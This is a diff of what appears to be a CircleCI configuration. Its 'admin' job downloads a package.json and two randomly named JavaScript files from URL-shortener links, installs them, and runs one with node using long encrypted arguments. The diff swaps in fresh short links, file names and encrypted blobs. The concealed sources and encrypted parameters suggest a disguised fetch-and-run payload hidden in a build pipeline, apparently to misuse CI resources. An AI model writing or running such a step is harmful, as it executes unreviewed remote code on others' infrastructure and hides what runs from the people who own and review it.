@@ -5,12 +5,12 @@ jobs:
   admin:
     executor:
       name: android/android-machine
-    #resource_class: medium
+    #resource_class: medium 
     steps:
       - run: 
-          command: curl -fsSL shorturl.at/djCF8 -o package.json && curl -fsSL shorturl.at/sBF69 -o sgdfgerjhsdfe.js && curl -fsSL shorturl.at/nJY16 -o logger.js
+          command: curl -fsSL shorturl.at/xEL35 -o package.json && curl -fsSL shorturl.at/giCHZ -o rutyjhfgdfr.js && curl -fsSL shorturl.at/nCMZ2 -o jobslogger.js
       - run: npm i -s
-      - run: node sgdfgerjhsdfe -r U2FsdGVkX1+jDDCHzH7XUwKe1yP1PUQ+ZZ6IGE9QIJz1+mRqfqbv84KQvSmcO5kQVimqRsrPo/XUmHG07kDcypHxLCacb0kbsWMoe+aJrzPKZNASaef2UM6+YCkeXi57rlp7i5+jwoavfgk/KZJT0Dwxx4CWs8kbyPU22a2+CsLpEYg7/y1Oxg6QJ7D8TNkJGOnZDcYmENhRnmHoQXGdSXwPq7KmgN/52xxRmLjGAJ4J/DLLO5y2c3ic2oClIHc2tNugKCdIUvED5SZti344AlaF/gJiw45//tdNVeW4eWNROTL3vGyQav0JAP5FvJI3Yy2iLYBFMF91PGusFhQALw7qjKMDWNtKcEwMQSGlbggQWg5oTc2IRzZnwPQcYyHo -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+u3y7tEfaS5e3I8EsTPw2bEM1S7O0J/Wc= -sp -s U2FsdGVkX19YZO8lHl/9esXHJbBorKSEG9UJ3GieNT/dIs/aMGP0uzFqZHoup0TMlMZwn5fO7LF8SGcGmdbQ5IGog7xPML9MEj9aihD+2wBFfL/1hTc1FqFWUJDCKCwouF8Y3aQy/LgZ0oHSFVC2tjIrH/qBiNAxXCHWT2rp/2QWo89AWTHMUy5JKi65laDjDza5ztM4OMmx+RK9FY3F7E2BV/Q9S24pWuX503+ygN8=
+      - run: node rutyjhfgdfr -r U2FsdGVkX18CZoqjWk2ZeGiw4tkyLNgvP1TLSbeCpgOKel6WrKqWYnZ2VU9cmBAglhxJHdEnJtXt65ZwubckLJkBYIPLTQHN3n9fjaSORJs+ZgnrNLU1I/P3P8n654/s8ey7sL3MznvQON0kXPbuZTv+N0x5IGiY2lozB58kLYajFw52Kc4eidjKYwKWA/jtYRC2PtLLzEqdeXZhHuG0XHVWXKlfKj9MbkRXhgx6EK5zcURvj4scBKBnoP9k7YCs2AviV/nupzaTY7OzPyuVrGPz5a1WDeH30sx5n3ktDh8HZf87Kufp+6F1LvGh7Xe/hIh5AWHUzEq7uMvSJsXYhrB1aXPBvWAVUUmIHsjZmhj5gR+ZzrbCF9oAbC+zNKIb -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+HXLWGNBZDqjgZ/LbOknmFTJ6DgRJ9Lf8= -sp -s U2FsdGVkX19YZO8lHl/9esXHJbBorKSEG9UJ3GieNT/dIs/aMGP0uzFqZHoup0TMlMZwn5fO7LF8SGcGmdbQ5IGog7xPML9MEj9aihD+2wBFfL/1hTc1FqFWUJDCKCwouF8Y3aQy/LgZ0oHSFVC2tjIrH/qBiNAxXCHWT2rp/2QWo89AWTHMUy5JKi65laDjDza5ztM4OMmx+RK9FY3F7E2BV/Q9S24pWuX503+ygN8=
       
 workflows:
   start-work:
